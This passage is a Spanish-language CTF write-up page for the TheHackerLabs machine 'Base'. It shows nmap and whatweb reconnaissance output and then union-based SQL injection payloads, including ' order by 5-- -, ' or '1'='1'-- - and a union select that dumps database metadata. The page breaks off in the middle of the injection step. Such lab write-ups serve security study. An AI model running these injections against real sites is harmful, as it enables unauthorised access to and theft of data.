@@ -1,0 +1,1349 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Base - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-base/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Base - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-base/base.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/resenia-eWPT/">
+          <span class="side-post-card-title">Reseña</span>
+          <span class="side-post-card-platform">Certificación eWPTv2</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-watchstore/">
+          <span class="side-post-card-title">WatchStore</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Base</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-facultad/">
+          <span class="side-post-card-title">Facultad</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-luna/">
+          <span class="side-post-card-title">Luna</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Medium Machine</div>
+    
+    <h1>Base - TheHackerLabs</h1>
+    <div class="post-meta">1 September 2025 · 15 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-base/base.png" alt="Base - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina un poco complicada. Después de analizar los escaneos, empezamos por analizar la página web activa en el puerto 80, resultando ser una página hecha con el CMS FlatPress. Al no encontrar nada útil, pasamos a la página web activa en el puerto 8080, que resulta ser vulnerable a Inyecciones SQL Basadas en Uniones. Logramos dumpear la base de datos del CMS FlatPress, obteniendo credenciales válidas con las que ganamos acceso a su login. Ya logueados, encontramos que la versión usada del FlatPress, siendo la 1.2.1, es vulnerable a File Upload Bypass, con lo que logramos cargar una WebShell de PHP que nos sirve para enviarnos una Reverse Shell, obteniendo el acceso principal a la máquina víctima. Dentro de la máquina, encontramos un hash guardado en un archivo de texto, que copiamos en nuestra máquina y logramos crackearlo con JohnTheRipper, resultando en la contraseña de un usuario de la máquina, que usamos para ganar acceso vía SSH. Como este usuario, descubrimos que está dentro del grupo ADM, lo que nos permite leer los logs de la máquina, siendo en un log de Apache2 donde encontramos la contraseña de otro usuario de la máquina. Como este nuevo usuario, descubrimos que tiene permisos sudoers sobre el binario awk. Utilizando la guía de GTFOBins, encontramos una forma de escalar privilegios con este binario, convirtiéndonos así en Root.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>whatweb</code></li><li><code>sqlmap</code></li><li><code>php</code></li><li><code>nc</code></li><li><code>bash</code></li><li><code>cat</code></li><li><code>grep</code></li><li><code>JohnTheRipper</code></li><li><code>ssh</code></li><li><code>sudo</code></li><li><code>id</code></li><li><code>find</code></li><li><code>python3</code></li><li><code>wget</code></li><li><code>gunzip</code></li><li><code>awk</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Puerto8080">Analizando Página Web del Puerto 8080</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#SQLiUnion">Aplicando Inyección SQL Basada en Uniones</a></li>
+        <li><a href="#SQLMAP">Automatizando Inyecciones SQL con SQLMAP</a></li>
+        <li><a href="#FlatPressBypass">Aplicando Bypass a Carga de Archivos de FlatPress Ver. 1.2.1 (File Upload Bypass + RCE)</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#linEnum">Enumeración de la Máquina Víctima, Crackeo de Hash Encontrado y Ganando Acceso a Máquina Vía SSH</a></li>
+        <li><a href="#Adm">Abusando de Grupo Adm para Leer Archivos Restringidos</a></li>
+        <li><a href="#awk">Escalando Privilegios Abusando de Permisos Sudoers Sobre Binario AWK</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Puerto8080">Analizando Página Web del Puerto 8080</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#SQLiUnion">Aplicando Inyección SQL Basada en Uniones</a></li>
+        <li><a href="#SQLMAP">Automatizando Inyecciones SQL con SQLMAP</a></li>
+        <li><a href="#FlatPressBypass">Aplicando Bypass a Carga de Archivos de FlatPress Ver. 1.2.1 (File Upload Bypass + RCE)</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#linEnum">Enumeración de la Máquina Víctima, Crackeo de Hash Encontrado y Ganando Acceso a Máquina Vía SSH</a></li>
+        <li><a href="#Adm">Abusando de Grupo Adm para Leer Archivos Restringidos</a></li>
+        <li><a href="#awk">Escalando Privilegios Abusando de Permisos Sudoers Sobre Binario AWK</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.100.70
+</span></span><span style="display:flex;"><span>PING 192.168.100.70 <span style="color:#f92672">(</span>192.168.100.70<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.70: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.99 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.70: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.72 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.70: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>2.49 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.100.70: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.67 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.100.70 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3036ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 1.665/1.966/2.487/0.324 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.100.70 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-09-01 10:38 CST
+</span></span><span style="display:flex;"><span>Happy 28th Birthday to Nmap, may it live to be 128!
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 10:38
+</span></span><span style="display:flex;"><span>Scanning 192.168.100.70 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 10:38, 0.06s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 10:38
+</span></span><span style="display:flex;"><span>Scanning 192.168.100.70 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 192.168.100.70
+</span></span><span style="display:flex;"><span>Discovered open port 8080/tcp on 192.168.100.70
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 192.168.100.70
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 10:39, 15.50s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.100.70
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.00068s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-09-01 10:38:58 CST <span style="color:#66d9ef">for</span> 16s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65420</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>, <span style="color:#ae81ff">112</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE    REASON
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh        syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http       syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 15.73 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">71888</span> <span style="color:#f92672">(</span>3.163MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65424</span> <span style="color:#f92672">(</span>2.617MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Veo 3 puertos abiertos y me da curiosidad el <strong>puerto 8080</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 22,80,8080 192.168.100.70 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-09-01 10:39 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.100.70
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00073s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> c8:5f:17:62:8c:26:0a:7b:b2:c6:07:33:31:64:84:30 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e3:92:58:d8:50:ac:00:5a:49:02:d7:e9:33:18:47:8c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.62 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: FlatPress
+</span></span><span style="display:flex;"><span>|_http-generator: FlatPress fp-1.2.1
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.62 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>8080/tcp open  http    Apache httpd 2.4.62 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Search Page
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.62 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-open-proxy: Proxy might be redirecting requests
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.63 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>La página web del <strong>puerto 80</strong>, muestra que se está usando <strong>FlatPress</strong> y la página web del <strong>puerto 8080</strong>, parece que tiene algún contenido que puede redirigir peticiones.</p>
+<p>Primero, veamos qué hay en la página web del <strong>puerto 80</strong> y luego la del <strong>puerto 8080</strong>.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura1.png">
+</p>
+<p>Se parece mucho al <strong>CMS WordPress</strong>. Investiguémoslo:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>FlatPress</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>FlatPress es un CMS (Content Management System) ligero, escrito en PHP, cuya característica principal es que no utiliza base de datos (como MySQL o PostgreSQL). En lugar de eso, almacena todo el contenido en archivos planos (flat files) dentro del servidor.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Pues es bastante similar a <strong>WordPress</strong>.</p>
+<p>Veamos qué nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura2.png">
+</p>
+<p>No hay mucho que destacar.</p>
+<p>La página web tiene un login, pero no podremos usarlo a menos que tengamos credenciales válidas.</p>
+<p>El código fuente nos dice que se está usando la <strong>versión 1.2.1</strong> de <strong>FlatPress</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura3.png">
+</p>
+<p>Guardemos este dato para más adelante.</p>
+<p>No encontraremos algo que nos pueda ayudar, así que vayamos a ver la otra página web.</p>
+<h3 id="Puerto8080">Analizando Página Web del Puerto 8080</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura4.png">
+</p>
+<p>Bastante curiosa la página, parece ser de búsqueda de datos.</p>
+<p>En este caso, <strong>Wappalizer</strong> no logrará identificar las tecnologías usadas.</p>
+<p>Veamos qué nos dice <strong>whatweb</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://192.168.100.70:8080
+</span></span><span style="display:flex;"><span>http://192.168.100.70:8080 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.62<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Debian Linux<span style="color:#f92672">][</span>Apache/2.4.62 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>192.168.100.70<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>Search Page<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>No hay mucho que destacar.</p>
+<p>Usando el ejemplo del buscador, si buscamos el nombre <strong>juan</strong>, la página nos dará sus datos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura5.png">
+</p>
+<p>Hay varias cosas a destacar:</p>
+<ul>
+<li>Al usar el ejemplo, en la URL aparece el uso de la página <strong>search.php</strong> y el parámetro <strong>query</strong> que parece estar haciendo una <strong>consulta SQL</strong>.</li>
+<li>El resultado de la búsqueda nos lo muestra en una tabla de 5 columnas.</li>
+</ul>
+<p>Esto me da a pensar que posiblemente se está utilizando una base de datos de <strong>MySQL</strong> en esta página, y que posiblemente sea vulnerable a <strong>SQLi Union-Based</strong>.</p>
+<p>Vamos a comprobarlo de manera manual y luego con la herramienta <strong>SQLMAP</strong>.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="SQLiUnion">Aplicando Inyección SQL Basada en Uniones</h3>
+<p>Para comprobar si es vulnerable a <strong>Inyecciones SQL Basada en Uniones</strong>, primero debemos saber si es vulnerable a <strong>Inyecciones SQL</strong>.</p>
+<p>Al ver 5 columnas en la tabla, es de suponer que existen 5 columnas en la tabla actual.</p>
+<p>Comprobémoslo con la siguiente inyección:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> order by 5-- -
+</span></span></code></pre></div><p>Observa el resultado:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura6.png">
+</p>
+<p>Si en vez de 5 usas 6, la página dejara de mostrarse, por lo que comprobamos que son 5 columnas.</p>
+<p>Ahora, podemos intentar dumpear todos los datos que tiene la tabla actual, suponiendo que están ocultos hasta que se busquen, con la siguiente inyección:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;</span>1<span style="color:#e6db74">&#39;=&#39;</span>1<span style="color:#960050;background-color:#1e0010">&#39;</span>-- -
+</span></span></code></pre></div><p>Observa el resultado:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura7.png">
+</p>
+<p>Muy bien, quizá alguno de estos usuarios pertenezca a la máquina víctima o al <strong>CMS FlatPress</strong>.</p>
+<p>Probemos a intentar reproducir algo en cada columna con la siguiente <strong>Inyección SQL Basada en Uniones</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> union <span style="color:#66d9ef">select</span> 1,2,3,4,5-- -
+</span></span></code></pre></div><p>Observa el resultado:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura8.png">
+</p>
+<p>Excelente, en cada columna se reproduce un número.</p>
+<p>Es posible que podamos obtener información del <strong>servicio MySQL</strong> usando algunas funciones.</p>
+<p>Prueba la siguiente inyección:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&#39;</span> union <span style="color:#66d9ef">select</span> database<span style="color:#f92672">()</span>,version<span style="color:#f92672">()</span>,user<span style="color:#f92672">()</span>,@@datadir,current_user<span style="color:#f92672">()</span>-- -
+</span></span></code></pre></div><p>Observa el resultado:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-base/Captura9.png">
+</p>
+<p>Con esas funciones obtenemos:</p>
+<ul>
